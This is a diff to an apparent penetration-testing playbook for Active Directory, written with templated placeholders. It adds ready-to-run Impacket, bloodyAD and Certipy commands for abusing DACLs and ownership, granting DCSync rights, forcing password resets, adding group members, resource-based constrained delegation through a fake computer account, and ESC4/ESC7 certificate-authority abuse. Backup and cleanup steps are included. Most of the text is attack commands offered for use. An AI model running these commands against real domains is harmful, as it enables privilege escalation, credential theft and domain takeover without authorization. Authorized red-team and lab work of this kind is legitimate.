@@ -20,12 +20,29 @@ Read the DACL first. Use the narrowest state-changing operation supported by the
 ```bash
 # Read the target DACL
 impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -principal '{{USER}}' -action read
+impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -action backup -file '{{DACL_BACKUP}}'
+```
+
+Choose **one** operation matching the verified right. WriteOwner changes ownership;
+record the original owner separately because a DACL backup does not back it up.
+
+```bash
 # If WriteOwner is confirmed
 impacket-owneredit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -new-owner '{{USER}}' -action write
+```
+
+```bash
 # If WriteDacl is confirmed
 impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -principal '{{USER}}' -action write -rights ResetPassword
+```
+
+For the domain root, use its distinguished name with **-target-dn**. Back up that
+object's DACL separately before this operation:
+
+```bash
 # DCSync rights against the domain root, only when the objective requires it
-impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{DOMAIN_DN}}' -principal '{{USER}}' -action write -rights DCSync
+impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target-dn '{{DOMAIN_DN}}' -action backup -file '{{DOMAIN_DACL_BACKUP}}'
+impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target-dn '{{DOMAIN_DN}}' -principal '{{USER}}' -action write -rights DCSync
 ```
 
 Reset a target password only after the required right is verified:
@@ -35,6 +52,35 @@ impacket-changepasswd -reset -protocol smb-samr '{{DOMAIN}}/{{TARGET_USER}}'@'{{
 ```
 
 Record the original DACL or object state, the changed principal, target object, exact right, and cleanup requirement. [Impacket dacledit](https://github.com/fortra/impacket/blob/master/examples/dacledit.py), [Impacket owneredit](https://github.com/fortra/impacket/blob/master/examples/owneredit.py), [Impacket changepasswd](https://github.com/fortra/impacket/blob/master/examples/changepasswd.py).
+
+### Restore a recorded DACL
+
+Review the saved backup and any concurrent legitimate changes before restoring.
+Use the correct backup for the object that was modified:
+
+```bash
+impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -action restore -file '{{DACL_BACKUP}}'
+```
+
+Restore a changed owner separately to its recorded value. A password reset cannot
+restore an unknown previous password; record that consequence before using it.
+
+### Group membership operation
+
+On Kali, confirm membership-control rights and record the group's original members.
+
+```bash
+bloodyAD --host '{{DC}}' -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' add groupMember '{{GROUP}}' '{{TARGET_USER}}'
+```
+
+Verify the resulting group and refresh the target account's logon/tickets. For
+cleanup, remove only the membership added by this operation:
+
+```bash
+bloodyAD --host '{{DC}}' -d '{{DOMAIN}}' -u '{{USER}}' -p '{{PASS}}' remove groupMember '{{GROUP}}' '{{TARGET_USER}}'
+```
+
+[bloodyAD group operations](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide).
 
 ## Delegation prerequisites
 
@@ -53,12 +99,30 @@ Use only after confirming write access to the target computer and a controlled m
 ```bash
 # Create a controlled computer account when quota permits
 impacket-addcomputer -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -computer-name 'FAKE01$' -computer-pass '{{COMPUTER_PASS}}'
+```
+
+Read and record the target's current delegation descriptor before adding an entry:
+
+```bash
+impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-to '{{TARGET_COMPUTER}}$' -action read
+```
+
+```bash
 # Allow the controlled account to impersonate users on the target
 impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-from 'FAKE01$' -delegate-to '{{TARGET_COMPUTER}}$' -action write
+```
+
+```bash
 # Request a ticket for the intended identity
 impacket-getST -dc-ip '{{DC}}' -spn 'cifs/{{TARGET_COMPUTER}}.{{DOMAIN}}' -impersonate '{{TARGET_USER}}' '{{DOMAIN}}/FAKE01$:{{COMPUTER_PASS}}'
-export KRB5CCNAME='{{TARGET_USER}}.ccache'
-nxc smb '{{TARGET_COMPUTER}}' -k --kdcHost '{{DC}}' -u '{{TARGET_USER}}' -p '{{PASS}}'
+```
+
+Set TICKET_PATH to the actual reported output filename, not an assumed username:
+
+```bash
+export KRB5CCNAME='{{TICKET_PATH}}'
+klist -c "$KRB5CCNAME"
+impacket-smbclient -k -no-pass -dc-ip '{{DC}}' '{{DOMAIN}}/{{TARGET_USER}}@{{TARGET_COMPUTER}}.{{DOMAIN}}'
 ```
 
 Verify the ticket and resulting identity. Remove the RBCD entry when required:
@@ -66,6 +130,9 @@ Verify the ticket and resulting identity. Remove the RBCD entry when required:
 ```bash
 impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-from 'FAKE01$' -delegate-to '{{TARGET_COMPUTER}}$' -action remove
 ```
+
+Remove the controlled computer only if this exercise created it; keep any
+pre-existing object and unrelated descriptor entries intact.
 
 [Impacket addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py), [Impacket rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py), [Impacket getST](https://github.com/fortra/impacket/blob/master/examples/getST.py).
 
@@ -138,22 +205,92 @@ Use only when the current principal has verified write access to the template. S
 ```bash
 certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
 certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -save-configuration '{{TEMPLATE}}.json'
+```
+
+Only with the saved configuration and verified template write access:
+
+```bash
 certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -write-default-configuration -force
-certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}'
+```
+
+Use the resulting ESC1 conditions with the correct target UPN and SID:
+
+```bash
+certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}' -sid '{{TARGET_SID}}'
+```
+
+Restore the saved template after verifying the issued certificate:
+
+```bash
 certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -write-configuration '{{TEMPLATE}}.json' -force
 ```
 
+[Certipy ESC4 workflow](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).
+
 ## ESC7 CA management
 
-Use only when CA manager or certificate-manager rights are verified. Request approval and cleanup requirements before changing CA state.
+This workflow requires verified **Manage CA** rights; Manage Certificates alone
+does not imply permission to add officers or enable templates. Run on Kali.
+Record the original officers and published templates before changing either.
 
 ```bash
 certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
 certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -list-templates
-certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -add-officer '{{USER}}'
-certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -enable-template '{{TEMPLATE}}'
-certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}'
 ```
+
+If required, add your controlled account as an officer:
+
+```bash
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -add-officer '{{USER}}'
+```
+
+Publish SubCA only if needed for the verified path:
+
+```bash
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -enable-template SubCA
+```
+
+Submit the request. A denied request can still have a Request ID. **Save its
+private key when prompted**, and retain `REQUEST_ID.key` in the working folder.
+
+```bash
+certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template SubCA -upn '{{TARGET_USER}}@{{DOMAIN}}' -sid '{{TARGET_SID}}'
+```
+
+Approve the recorded request, not an invented or another user's ID:
+
+```bash
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -issue-request '{{REQUEST_ID}}'
+```
+
+Retrieve it with its retained private key. Certipy looks for the matching
+`REQUEST_ID.key` file; otherwise use the installed version's `-key-file` option.
+
+```bash
+certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -retrieve '{{REQUEST_ID}}'
+```
+
+Authenticate with the actual PFX output path and verify the intended identity:
+
+```bash
+certipy auth -pfx '{{PFX_PATH}}' -dc-ip '{{DC}}'
+```
+
+If the workflow added the officer, remove that added role after use:
+
+```bash
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -remove-officer '{{USER}}'
+```
+
+If it enabled SubCA, restore its prior unpublished state separately:
+
+```bash
+certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -disable-template SubCA
+```
+
+Restoring roles/templates does not revoke an issued certificate. Record issuance,
+private-key handling and any remaining cleanup with the lab objective.
+[Certipy ESC7 prerequisites and complete flow](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation).
 
 ## ESC8 relay conditions
 
